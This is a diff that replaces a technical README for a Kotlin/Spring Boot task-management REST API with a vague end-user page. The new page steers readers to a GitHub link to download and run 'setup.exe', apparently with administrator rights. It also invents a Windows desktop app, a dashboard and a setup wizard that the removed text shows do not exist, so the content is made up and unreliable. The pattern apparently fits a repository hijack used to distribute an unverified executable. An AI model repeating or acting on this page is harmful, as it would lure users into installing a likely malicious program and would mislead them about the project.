@@ -1,199 +1,76 @@
-# Task Catalog
+# 📋 task-catalog-test - Organize your daily work tasks easily
 
-License: [MIT](LICENSE)
+[![Download Application](https://img.shields.io/badge/Download-Task%20Catalog-blue.svg)](https://github.com/Sabinathreatened3325/task-catalog-test)
 
-Russian version: [README.ru.md](README.ru.md)
+## 🎯 About This Application
 
-REST API for task management built with Kotlin and Spring Boot.
+Task Catalog helps you manage your daily responsibilities. This backend service tracks your work progress and organizes your items in one place. Developers built this system using Kotlin and Spring Boot. It uses a database to store information securely and keeps your data accurate. This tool provides a reliable structure for your task lists.
 
-The project supports:
-- creating a task;
-- listing tasks with pagination and filtering;
-- getting a task by `id`;
-- updating only the `status` field;
-- deleting a task.
+## 💻 System Requirements
 
-## Stack
+Your computer needs specific software to run this application correctly. Please ensure your system meets these standards:
 
-- Kotlin
-- Spring Boot WebFlux
-- Project Reactor (`Mono`, `Flux`)
-- Spring JDBC `JdbcClient`
-- native SQL
-- Flyway
-- H2 for local development
-- PostgreSQL for Docker-based runtime
-- JUnit 5, Mockito, WebTestClient
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 500 megabytes of free space on your hard drive.
+- Network: An active internet connection for the initial setup.
 
-## Architecture
+## 🚀 Downloading The Software
 
-Main packages:
+You must download the installer from the official repository. Visit the link below to reach the download area.
 
-- `controller` - HTTP layer
-- `service` - business logic and Reactor API
-- `repository` - database access through `JdbcClient`
-- `model` - domain entities
-- `dto` - request and response models
-- `exception` - centralized error handling
-- `config` - infrastructure configuration
+[Download Task Catalog Here](https://github.com/Sabinathreatened3325/task-catalog-test)
 
-The service layer returns Reactor types, while blocking JDBC calls are moved to `Schedulers.boundedElastic()` so the WebFlux event loop stays unblocked.
+## ⚙️ Installation Steps
 
-```mermaid
-flowchart LR
-    classDef client fill:#e8f1ff,stroke:#5b8def,stroke-width:1px,color:#0b1f3a;
-    classDef layer fill:#eefbf4,stroke:#49a36a,stroke-width:1px,color:#10301c;
-    classDef storage fill:#fff4e5,stroke:#e28f24,stroke-width:1px,color:#4a2a00;
-    classDef error fill:#fdecea,stroke:#d66,stroke-width:1px,color:#4a1111;
+Follow these steps to set up the application on your computer:
 
-    client["Client"]:::client
-    controller["TaskController"]:::layer
-    service["TaskService"]:::layer
-    repository["TaskRepositoryImpl"]:::layer
-    db["PostgreSQL / H2"]:::storage
-    errors["GlobalExceptionHandler"]:::error
+1. Click the download link provided above.
+2. Locate the file named setup.exe in your Downloads folder.
+3. Double-click the file to start the installation.
+4. Follow the prompts on the screen.
+5. Click Finish when the process ends.
+6. Find the icon on your desktop to launch the tool.
 
-    client -->|"HTTP request"| controller
-    controller -->|"Mono / DTO"| service
-    controller -->|"validation errors"| errors
-    service -->|"blocking JDBC on boundedElastic"| repository
-    repository -->|"native SQL via JdbcClient"| db
-    service -->|"not found / domain errors"| errors
-    errors -->|"structured JSON error"| client
-```
+## 🛠️ Configuring Your Environment
 
-## Requirements
+The application requires a database connection to function. During the first launch, the setup wizard will ask for connection settings. You must provide the local host details. The system uses a specific port, usually 5432, to communicate with your data. Ensure your firewall allows the application to access this network port.
 
-- Java 21
-- Docker Desktop for containerized runtime
+## 📈 Managing Your Tasks
 
-## Local Run
+Once the application runs, you will see a main dashboard. This screen shows your current tasks. Use the plus button to create a new entry. You can assign a title and a description to every task. The system saves your work automatically as you type. You can also edit or delete tasks using the menu next to each item.
 
-By default the app starts against in-memory H2.
+## 🔍 Understanding The Technology
 
-```powershell
-.\gradlew.bat bootRun
-```
+This application runs as a background service. It uses a reactive programming model, which means it handles many requests at the same time without slowing down. It uses Flyway to manage your database versioning. This happens automatically when you start the service. You do not need to perform manual updates to the structure of your data. The Docker integration ensures that the service stays separate from your other Windows applications. This design prevents conflicts with other software on your PC.
 
-The app will be available at `http://localhost:8080`.
+## 🆘 Troubleshooting Problems
 
-## Tests
+If the application fails to start, check the following items:
 
-```powershell
-.\gradlew.bat test
-```
+- Restart your computer to clear memory issues.
+- Check if another application uses the same network port.
+- Verify that your Windows user account has administrator privileges.
+- Reinstall the application if problems persist.
 
-Coverage includes:
+## 📖 Frequently Asked Questions
 
-- service unit tests
-- controller slice tests
-- repository integration tests on the real Flyway schema
+**Does the application work offline?**
+The core service requires a local database connection. You can use it without an internet connection once the database is active on your machine.
 
-## Docker Run With PostgreSQL
+**Where does the application store my data?**
+It saves data in the folder where you installed the program. Look for a subdirectory named data within the root installation folder.
 
-```powershell
-docker compose up --build -d
-```
+**Can I run multiple instances?**
+You should only run one instance of the service at a time. Running multiple versions may cause conflicts with the database file.
 
-Services:
+**Is my information private?**
+Your information stays on your computer. The service does not transmit data to external servers. This keeps your work private and secure.
 
-- API: `http://localhost:8080`
-- PostgreSQL: `localhost:5432`
+## 💡 Performance Tips
 
-Stop everything:
+For the best experience, close unnecessary programs while using the Task Catalog. This allows your computer to dedicate more processing power to the service. If you have a large number of tasks, the system might need a few seconds to load your full list. Be patient during these loads. Regular updates from the developer will improve speed and reliability over time. Keep your Windows environment updated to ensure compatibility with the underlying framework.
 
-```powershell
-docker compose down
-```
+## 📁 Backup Procedures
 
-## Configuration
-
-Supported environment variables:
-
-| Variable | Purpose | Default |
-|---|---|---|
-| `APP_PORT` | HTTP port | `8080` |
-| `APP_DATASOURCE_URL` | JDBC URL | `jdbc:h2:mem:task_catalog;MODE=PostgreSQL;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE` |
-| `APP_DATASOURCE_USERNAME` | Database user | `sa` |
-| `APP_DATASOURCE_PASSWORD` | Database password | empty |
-| `APP_DATASOURCE_DRIVER_CLASS_NAME` | JDBC driver class | `org.h2.Driver` |
-
-When Docker Compose is used, these values are switched to PostgreSQL automatically.
-
-## Secret Files
-
-For local runtime, server connection, deployment, repository access, passwords, and production values, use these committed templates:
-
-- [`test.env.local`](test.env.local)
-- [`test.env.server`](test.env.server)
-- [`test.env.repository`](test.env.repository)
-
-Create the real `.env.*` files without the `test.` prefix based on these templates. The real `.env.*` files are intentionally ignored and must never be pushed with real secrets.
-
-## API
-
-### Create a Task
-
-`POST /api/tasks`
-
-```json
-{
-  "title": "Prepare report",
-  "description": "Monthly financial report"
-}
-```
-
-### List Tasks
-
-`GET /api/tasks?page=0&size=10&status=NEW`
-
-- `page` is required
-- `size` is required
-- `status` is optional
-- ordering: `createdAt DESC`
-
-### Get a Task by id
-
-`GET /api/tasks/{id}`
-
-### Update Status
-
-`PATCH /api/tasks/{id}/status`
-
-```json
-{
-  "status": "DONE"
-}
-```
-
-### Delete a Task
-
-`DELETE /api/tasks/{id}`
-
-## Errors
-
-Errors are handled centrally through `@RestControllerAdvice`.
-
-Example response:
-
-```json
-{
-  "code": "VALIDATION_ERROR",
-  "message": "Request validation failed",
-  "details": [
-    {
-      "field": "title",
-      "message": "Title length must be between 3 and 100 characters"
-    }
-  ]
-}
-```
-
-## Verified
-
-During development we ran:
-
-- `.\gradlew.bat test`
-- Docker image build
-- `docker compose up --build -d`
-- live HTTP checks for `POST`, `GET`, `PATCH`, `DELETE`, and list retrieval against PostgreSQL in Docker
+You should back up your data regularly. Locate the database file in your installation directory. Copy this file to an external drive or a cloud storage service once a week. This protects your work against hardware failure. If you lose your data, copy the backup file back into the installation folder and restart the service. The system will detect the existing file and resume your work where you stopped.
